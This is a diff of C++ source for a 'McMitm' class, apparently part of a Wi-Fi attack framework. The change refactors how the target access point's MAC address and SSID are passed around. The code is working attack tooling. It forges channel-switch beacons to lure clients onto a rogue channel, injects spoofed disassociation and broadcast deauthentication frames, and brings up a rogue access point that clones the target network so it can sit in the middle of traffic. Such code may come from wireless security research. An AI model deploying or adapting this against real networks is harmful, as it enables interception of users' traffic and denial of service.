@@ -18,14 +18,13 @@ using namespace chrono;
 using namespace Tins;
 
 
-McMitm::McMitm(const ActorPtr &rogue_sta, const ActorPtr &rogue_ap, string ssid, const string &ap_mac,
+McMitm::McMitm(const ActorPtr &rogue_sta, const ActorPtr &rogue_ap, const ActorPtr &ap,
 				const string &client_mac, optional<filesystem::path> log_folder, const bool only_to_mitm
 )
 : rogue_sta(rogue_sta),
 rogue_ap(rogue_ap),
-ssid(std::move(ssid)),
+ap(ap),
 // TODO fallback to info from actors
-ap_mac(ap_mac),
 only_to_mitm(only_to_mitm),
 client_state(client_mac, std::move(log_folder)){}
 
@@ -37,7 +36,7 @@ void McMitm::send_csa_beacon(const int numpairs, const optional<HWAddress<6>> &t
 	if(target.has_value()) beacon_copy->addr1(*target);
 
 	for(int i = 0; i < numpairs; ++i){
-		RadioTap csa_rt = CSA_attack::get_CSA_beacon(ap_mac, ssid, netconfig.real_channel, netconfig.rogue_channel);
+		RadioTap csa_rt = CSA_attack::get_CSA_beacon(ap.get(SK::mac), ap.get(SK::ssid), netconfig.real_channel, netconfig.rogue_channel);
 		send_to_real(csa_rt);
 
 		// Intel firmware requires first receiving a CSA beacon with a count of 2 or higher,
@@ -57,8 +56,8 @@ void McMitm::send_csa_beacon(const int numpairs, const optional<HWAddress<6>> &t
 void McMitm::send_disas(const HWAddress<6> &macaddr) const{
 	Dot11Disassoc disas{};
 	disas.addr1(macaddr);
-	disas.addr2(ap_mac);
-	disas.addr3(ap_mac);
+	disas.addr2(ap.get(SK::mac));
+	disas.addr3(ap.get(SK::mac));
 	disas.reason_code(0);
 	send_to_rogue(disas);
 	log(LogLevel::INFO, "Rogue channel: injected Disassociation to {}", macaddr);
@@ -82,8 +81,8 @@ void McMitm::try_channel_switch(const HWAddress<6> &macaddr){
 void McMitm::send_deauth_as_ap() const{
 	Dot11Deauthentication deauth;
 	deauth.addr1(client_state.get_mac());
-	deauth.addr2(ap_mac);
-	deauth.addr3(ap_mac);
+	deauth.addr2(ap.get(SK::mac));
+	deauth.addr3(ap.get(SK::mac));
 	deauth.reason_code(3);
 
 	RadioTap rt;
@@ -119,10 +118,10 @@ void McMitm::setup_real_AP_RSN_frames(){
 	rogue_sta->set_iface_up();
 
 	// get real AP beacon
-	beacon = scan::RSN_scan(rogue_sta.get(SK::iface), 20, HWAddress(ap_mac), std::nullopt, rogue_sta[SK::netns]); //TODO hardcoded tscan_timeout
+	beacon = scan::RSN_scan(rogue_sta.get(SK::iface), 20, ap.get(SK::mac), std::nullopt, rogue_sta[SK::netns]); //TODO hardcoded tscan_timeout
 	if(!beacon){
 		log(LogLevel::ERROR,
-			"No beacon received of network <{}>. Is monitor mode working? Did you enter the correct SSID?", ssid);
+			"No beacon received of network <{}>. Is monitor mode working? Did you enter the correct SSID?", ap.get(SK::ssid));
 		return;
 	}
 
@@ -136,7 +135,7 @@ void McMitm::setup_real_AP_RSN_frames(){
 	if(auto *ch_ie = beacon->search_option(Dot11ManagementFrame::DS_SET))
 		const_cast<uint8_t *>(ch_ie->data_ptr())[0] = netconfig.rogue_channel.ch_num;
 	probe_resp = make_unique<Dot11ProbeResponse>(beacon_to_probe_resp(*beacon, netconfig.rogue_channel));
-	log(LogLevel::INFO, "Target network {} detected on channel {}", ap_mac, netconfig.real_channel.ch_num);
+	log(LogLevel::INFO, "Target network {} detected on channel {}", ap.get(SK::mac) , netconfig.real_channel.ch_num);
 }
 
 void McMitm::run(RunStatus &rs, const int timeout_sec){
@@ -154,12 +153,13 @@ void McMitm::run(RunStatus &rs, const int timeout_sec){
 	// const bool start_nic_real_ap = !hw_capabilities::set_monitor_active(rogue_sta.get(SK::iface), netconfig.real_channel);
 	const bool start_nic_real_ap = true;
 
-	const string nic_real_ap = AP_IFACE_PREFIX + "ap"; //FIXME hardcoded
+	const string nic_client_ap = AP_IFACE_PREFIX + "client_ack"; //FIXME hardcoded
 	if(start_nic_real_ap){
 		rogue_sta->set_mac_address(client_state.get_mac());
-		start_ap(rs, nic_real_ap, rogue_sta, netconfig.real_channel, *beacon, client_state.get_mac());
+		// client need to ACK -> needs ap
+		start_ap(rs, nic_client_ap, rogue_sta, netconfig.real_channel, *beacon, client_state.get_mac());
 	} else{
-		hw_capabilities::set_iface_down(nic_real_ap, rogue_sta[SK::netns]);
+		hw_capabilities::set_iface_down(nic_client_ap, rogue_sta[SK::netns]);
 		rogue_sta->set_mac_address(client_state.get_mac());
 		hw_capabilities::run_cmd({"iw", rogue_sta.get(SK::iface), "set", "monitor", "active"}, rogue_sta[SK::netns]);
 		this_thread::sleep_for(seconds(15));
@@ -168,11 +168,11 @@ void McMitm::run(RunStatus &rs, const int timeout_sec){
 
 	/*rogue_sta->set_iface_down(); //TODO chenge to set_channel
 	rogue_sta->set_channel(Channel{netconfig.real_channel.ch_num, WifiBand::BAND_2_4, nullopt});
-	rogue_sta->set_iface_up();
-	*/
+	rogue_sta->set_iface_up();*/
+
 
 	//FIXME change to wlan host or add comment
-	string bpf = "(wlan addr1 " + ap_mac.to_string() + ") or (wlan addr2 " + ap_mac.to_string() + ")";
+	string bpf = "(wlan addr1 " + ap.get(SK::mac) + ") or (wlan addr2 " +  ap.get(SK::mac) + ")";
 	bpf += " or (wlan addr1 " + client_state.get_mac().to_string() + ") or (wlan addr2 " + client_state.get_mac().
 			to_string() + ")";
 	bpf = "(wlan type data or wlan type mgt) and (" + bpf + ")";
@@ -181,11 +181,11 @@ void McMitm::run(RunStatus &rs, const int timeout_sec){
 	sock_real->set_filter(bpf);
 
 	// set up the rogue AP and interfaces
-	log(LogLevel::INFO, "Setting MAC address of {} to {}", rogue_ap->get_ap_iface(), ap_mac);
+	log(LogLevel::INFO, "Setting MAC address of {} to {}", rogue_ap->get_ap_iface(), ap.get(SK::mac));
 	rogue_ap->set_iface_up();
-	rogue_ap->set_mac_address(ap_mac);
+	rogue_ap->set_mac_address(ap.get(SK::mac));
 	// Set up a rogue AP that clones the target network -> ACK back to client
-	start_ap(rs, rogue_ap->get_ap_iface(), rogue_ap, netconfig.rogue_channel, *beacon, ap_mac);
+	start_ap(rs, rogue_ap->get_ap_iface(), rogue_ap, netconfig.rogue_channel, *beacon, ap.get(SK::mac));
 	//hw_capabilities::run_cmd({"iw", "dev", nic_real_ap, "station", "add", client_mac.to_string()}, rogue_sta-[SK::netns], false);
 
 	sock_rogue = make_unique<MonitorSocket>(rogue_ap.get(SK::iface), rogue_ap[SK::netns]);
@@ -200,9 +200,9 @@ void McMitm::run(RunStatus &rs, const int timeout_sec){
 
 	/* only for non MFP requests*/
 	Dot11Deauthentication deauth{};
-	deauth.addr1(HWAddress < 6 > ::broadcast);
-	deauth.addr2(ap_mac);
-	deauth.addr3(ap_mac);
+	deauth.addr1(HWAddress<6>::broadcast);
+	deauth.addr2(ap.get(SK::mac));
+	deauth.addr3(ap.get(SK::mac));
 	deauth.reason_code(3);
 	send_to_real(deauth);
 
